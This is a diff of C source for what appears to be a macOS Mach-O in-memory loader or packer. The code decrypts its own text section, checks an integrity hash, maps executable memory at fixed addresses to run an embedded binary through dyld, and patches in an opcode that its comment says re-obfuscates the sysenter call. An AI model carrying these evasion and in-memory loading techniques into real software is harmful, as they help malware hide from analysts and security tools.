@@ -89,7 +89,8 @@ ssize_t mh_read(int fildes, void *buf, size_t nbyte, int offset)
   return __mh_read(fildes, buf, nbyte);
 }
 
-#define VMADDR_OFFSET 0x11100000
+//#define VMADDR_OFFSET 0x11100000
+#define VMADDR_OFFSET 0x00000
 
 /*
  *  resolve_dyld_start(int fd, void *mheader_ptr)
@@ -222,7 +223,6 @@ void *open_and_resolve_dyld()
   return addr;
 }
 
-
 int launch_dyld(int name_len, const char* name, const char *env[], char* exec_buff, void *_Dyld_start)
 {
   int ret_val=0;
@@ -327,8 +327,7 @@ __END_ENC_TEXT_FUNC
 
 int entry_point(int argc, const char * argv[], const char *env[])
 {
-  int ret_val=0;
-
+  int ret_val=0;  
   mh_mmap_t   _mh_mmap      = NULL;
   strlen_t    _strlen       = (void*)0xFF3000;
   in_param**  patch_param   = (void*)0x2000;
@@ -361,15 +360,21 @@ int entry_point(int argc, const char * argv[], const char *env[])
 
   // decrypt text section
   enc_unpacker_text_section(enc_begin_block_addr, enc_block_len);
-
+  
   _check_integrity((*patch_param)->hash);
   
   //mh_bsdthread_create(_check_integrity, &(patched_param->hash), 0x80000, 0, 0);
   
   const char* name = argv[0];
+    
+  int*  patch_sysmap = (int*)((char*)endpcall - (*patch_param)->sys_mmap_offset - ENDCALL_LEN);
+    
+  int   name_len     = _strlen((char*)name) + 1;  
+  char* exec_buff    = (char*)_mh_mmap((void*)0x1000, patched_param->macho_len, 7, 0x1012, -1, 0);
   
-  int   name_len     = _strlen((char*)name) + 1;
-  char* exec_buff    = (char*)_mh_mmap((void*)0x2000, patched_param->macho_len, 7, 0x1012, -1, 0);
+  // reobfuscate sysenter in mmap
+  *patch_sysmap      = 0x8Bc4458B;
+  
   char* exec_ptr_in  = (char*)patched_param->macho;
   char* exec_ptr_out = (char*)exec_buff;
   
